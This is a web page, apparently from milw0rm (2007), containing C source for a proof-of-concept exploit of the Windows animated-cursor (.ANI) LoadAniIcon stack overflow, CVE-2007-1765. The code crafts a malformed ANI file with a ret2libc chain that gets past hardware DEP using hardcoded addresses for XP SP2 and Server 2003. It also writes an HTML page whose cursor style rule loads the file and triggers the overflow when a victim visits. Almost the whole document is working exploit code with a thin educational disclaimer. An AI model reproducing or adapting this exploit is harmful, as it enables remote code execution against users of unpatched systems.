<html><head><title>MS Windows Animated Cursor (.ANI) Overflow Exploit (Hardware DEP)</title></head><pre>/*
* version 0.5
* Copyright (c) 2007 devcode
*
*
*			^^ D E V C O D E ^^
*
* Windows .ANI LoadAniIcon Stack Overflow For Hardware DEP XP SP2
* [CVE-2007-1765]
*
*
* Description:
*    A vulnerability has been identified in Microsoft Windows,
*    which could be exploited by remote attackers to take complete
*    control of an affected system. This issue is due to a stack overflow
*    error within the &quot;LoadAniIcon()&quot; [user32.dll] function when rendering
*    cursors, animated cursors or icons with a malformed header, which could
*    be exploited by remote attackers to execute arbitrary commands by
*    tricking a user into visiting a malicious web page or viewing an email
*    message containing a specially crafted ANI file.
*
* Hotfix/Patch:
*    None as of this time.
*
* Vulnerable systems:
*	  Microsoft Windows 2000 Service Pack 4
*	  Microsoft Windows XP Service Pack 2
*	  Microsoft Windows XP 64-Bit Edition version 2003 (Itanium)
*	  Microsoft Windows XP Professional x64 Edition
*	  Microsoft Windows Server 2003
*	  Microsoft Windows Server 2003 (Itanium)
*	  Microsoft Windows Server 2003 Service Pack 1
*	  Microsoft Windows Server 2003 Service Pack 1 (Itanium)
*	  Microsoft Windows Server 2003 x64 Edition
*	  Microsoft Windows Vista
*
*	  Microsoft Internet Explorer 6
*	  Microsoft Internet Explorer 7
*
* Tested on:
* 	 Microsoft XP SP2 + DEP + Internet Explorer 6
*
*    This is a PoC and was created for educational purposes only. The
*    author is not held responsible if this PoC does not work or is
*    used for any other purposes than the one stated above.
*
*	Credit goes to HOD (if he/they exist :P) for the html. Works on
*    XP SP2 with Hardware DEP enabled, go figure.
*
*    ^^ shoutz to Wonk(if he exists r0fl), InTeL, thrasher :)
*
*
*/
#include &lt;iostream&gt;
#include &lt;windows.h&gt;

/* ANI Header */
unsigned char uszAniHeader[] =
&quot;\x52\x49\x46\x46\x00\x04\x00\x00\x41\x43\x4F\x4E\x61\x6E\x69\x68&quot;
&quot;\x24\x00\x00\x00\x24\x00\x00\x00\xFF\xFF\x00\x00\x0A\x00\x00\x00&quot;
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
&quot;\x10\x00\x00\x00\x01\x00\x00\x00\x54\x53\x49\x4C\x03\x00\x00\x00&quot;
&quot;\x10\x00\x00\x00\x54\x53\x49\x4C\x03\x00\x00\x00\x02\x02\x02\x02&quot;
&quot;\x61\x6E\x69\x68\xA8\x03\x00\x00&quot;;

/* system(&quot;calc.exe&quot;); */
char szExecute[] = &quot;logoff.exe\x00&quot;;

unsigned char uszHtml[] =
&quot;&lt;html&gt;&quot;
&quot;Microsoft Windows .ANI LoadAniIcon Exploit&quot;
&quot;&lt;br&gt;Copyright (c) 2007 devcode&lt;br&gt;&quot;
&quot;&lt;style&gt;&quot; \
&quot;* {CURSOR: url(\&quot;poc.ani\&quot;)}&lt;/style&gt;&lt;/head&gt;&quot;
&quot;&lt;/html&gt;&quot;;

/* Usage: ani.exe 1*/
char szIntro[] =
&quot;\n\t\tWindows .ANI LoadAniIcon Stack Overflow\n&quot;
&quot;\t\t\tdevcode (c) 2007\n&quot;
&quot;[+] Targets:\n&quot;
&quot;\t(0) Kernel32.dll (ExitProcess)\n&quot;
&quot;\t(1) Windows XP SP2 + DEP\n&quot;
&quot;\t(2) Windows 2003 Server\n&quot;
&quot;Usage: ani.exe &lt;target&gt;&quot;;

/* RET2LIBC attack */
typedef struct {
	const char *szTarget;
	/* kernel32.dll - set the proper stack frame
		LEA EBP, DWORD PTR SS:[ESP+10]
		SUB ESP, EAX
		PUSH EBX
		PUSH ESI
		PUSH EDI
		....
		....
		RETN
	*/
	unsigned char uszRet[5];
	/* msvcrt.dll - system() */
	unsigned char uszMsvcrtCall[5];
} TARGET;

TARGET targets[] = {
	{ &quot;Kernel32.dll (ExitProcess)&quot;, &quot;\x90\x90\x90\x90&quot;, &quot;\x90\x90\x90\x90&quot; },
	{ &quot;Windows XP SP2&quot;, &quot;\xD6\x24\x80\x7C&quot;, &quot;\xC7\x93\xC2\x77&quot; },
	{ &quot;Windows 2003 Server&quot;, &quot;\x0A\x17\xE4\x77&quot;, &quot;\x10\x8C\xBB\x77&quot; }
};

int main( int argc, char **argv ) {
	char szBuffer[1024];
	FILE *f;
	void *pExitProcess[4];

	if ( argc &lt; 2 ) {
		printf(&quot;%s\n&quot;, szIntro );
		return 0;
	}

	if ( atoi( argv[1] ) == 0 ) {
		printf(&quot;[+] Getting ExitProcess address...\n&quot;);
		*pExitProcess = GetProcAddress( GetModuleHandle( &quot;kernel32.dll&quot; ), 
&quot;ExitProcess&quot; );
		if ( pExitProcess == NULL ) {
			printf(&quot;[-] Cannot get ExitProcess address\n&quot;);
			return 0;
		}
		memcpy( targets[1].uszRet, pExitProcess, 4 );
	}

	printf(&quot;[+] Creating ANI header...\n&quot;);
	memset( szBuffer, 0x90, sizeof( szBuffer ) );
	memcpy( szBuffer, uszAniHeader, sizeof( uszAniHeader ) - 1 );

	printf(&quot;[+] Copying execution code...\n&quot;);
	memcpy( szBuffer + 168, targets[atoi( argv[1] )].uszRet, 4 );
	memset( szBuffer + 136, 0, 4 );
	memset( szBuffer + 204, 0, 4 );
	szBuffer[136] = 0x6C;
	szBuffer[204] = 0x6C;
	memcpy( szBuffer + 196, targets[atoi(argv[1])].uszMsvcrtCall, 4 );
	memcpy( szBuffer + 200, targets[atoi(argv[1])].uszMsvcrtCall, 4 );
	memcpy( szBuffer + 240, szExecute, sizeof( szExecute ) - 1 );

	f = fopen( &quot;poc.ani&quot;, &quot;wb&quot; );
	if ( f == NULL ) {
		printf(&quot;[-] Cannot create ani file\n&quot;);
		return 0;
	}

	fwrite( szBuffer, 1, 1024, f );
	fclose( f );
	printf(&quot;[+] .ANI file succesfully created!\n&quot;);

	f = fopen( &quot;poc.html&quot;, &quot;wb&quot; );
	if ( f == NULL ) {
		printf(&quot;[-] Cannot create html file\n&quot;);
		return 0;
	}

	fwrite( uszHtml, 1, sizeof( uszHtml ), f );
	fclose( f );
	printf(&quot;[+] HTML file succesfully created!\n&quot;);

	return 0;
}

// milw0rm.com [2007-04-03]</pre></html>